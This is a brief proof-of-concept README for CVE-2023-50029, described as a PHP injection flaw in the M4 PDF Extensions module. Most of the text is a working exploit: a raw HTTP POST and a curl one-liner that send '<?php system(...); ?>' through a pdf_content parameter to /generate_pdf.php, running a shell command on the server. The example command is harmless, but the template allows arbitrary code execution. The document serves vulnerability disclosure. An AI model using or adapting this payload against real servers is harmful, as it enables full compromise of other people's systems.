# PHP-Injection-in-M4-PDF-Extensions
CVE-2023-50029 is a PHP injection vulnerability in the M4 PDF Extensions module. This vulnerability allows attackers to inject and execute arbitrary PHP code on the server, enabling them to gain full control over the targeted system. The issue lies in the improper validation of inputs, allowing malicious code to be passed through user parameters.

### Poc
```
POST /generate_pdf.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

pdf_content=<?php system('uname -a'); ?>
```

### OR Curl
```
curl -X POST http://example.com/generate_pdf.php -d "pdf_content=<?php system('uname -a'); ?>"
```
